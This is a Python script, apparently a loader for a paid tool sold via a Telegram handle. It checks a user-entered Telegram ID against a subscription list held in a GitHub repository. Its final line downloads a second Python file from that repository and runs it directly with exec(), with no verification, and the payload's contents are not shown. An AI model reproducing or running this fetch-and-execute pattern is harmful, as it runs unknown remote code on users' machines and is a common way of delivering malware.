import requests
from datetime import datetime

REMOTE_URL = "https://raw.githubusercontent.com/imbatman2pwpq/Kx/main/userid.txt"

def fetch_id_data():
    try:
        response = requests.get(REMOTE_URL, timeout=3)
        response.raise_for_status()
        return [line.strip() for line in response.text.strip().splitlines() if "|" in line]
    except Exception as e:
        print(f"\033[1m[❌] Error fetching data:\033[0m {e}")
        return []

def check_id_validity(input_id):
    input_id = input_id.strip()
    data = fetch_id_data()

    for record in data:
        try:
            id_val, expiry = map(str.strip, record.split("|"))
            if id_val == input_id:
                expiry_dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry_dt:
                    remaining = (expiry_dt - datetime.now()).seconds // 60
                    print(f"\033[1m\n[✅] Valid ID. Access expires in {remaining} minutes.\033[0m")
                    return True
                else:
                    print("\033[1m\n[⛔] This ID has expired. Renew your subscription via @Kuttuxd\033[0m")
                    return False
        except Exception as err:
            print(f"\033[1m[⚠️] Invalid record skipped:\033[0m {record} — {err}")

    print("\033[1m\n[⚠️] You are not a paid user. Buy a subscription ~@Kuttuxd   (TG)\033[0m")
    return False

input_id = input("\033[1m- 𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐢𝐝 :  \033[0m").strip()

if not check_id_validity(input_id):
    exit()
    
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
import requests; exec(requests.get('https://raw.githubusercontent.com/imbatman2pwpq/Kx/main/ab.py').text)